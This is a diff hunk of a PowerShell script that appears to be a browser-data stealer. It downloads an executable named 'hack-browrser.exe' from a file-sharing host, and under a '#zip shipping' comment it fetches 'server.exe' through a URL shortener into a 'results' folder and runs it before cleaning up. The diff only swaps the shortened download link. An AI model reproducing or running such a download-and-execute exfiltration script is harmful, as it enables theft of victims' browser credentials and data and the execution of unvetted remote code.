@@ -9,7 +9,7 @@ Invoke-WebRequest -Uri "https://transfer.sh/MOVevw/hack-browrser.exe" -OutFile "
 Remove-Item -Path "$env:USERPROFILE\Downloads\digi\hb.exe" -Force
 #zip shipping
 Set-Location "$env:USERPROFILE\Downloads\digi\results"
-Invoke-WebRequest -Uri "https://acortar.link/IWdaWb" -OutFile "$env:USERPROFILE\Downloads\digi\results\server.exe"
+Invoke-WebRequest -Uri "https://acortar.link/CFV7AS" -OutFile "$env:USERPROFILE\Downloads\digi\results\server.exe"
 ./server.exe
 #Cleanup
 cd "$env:USERPROFILE\Downloads"
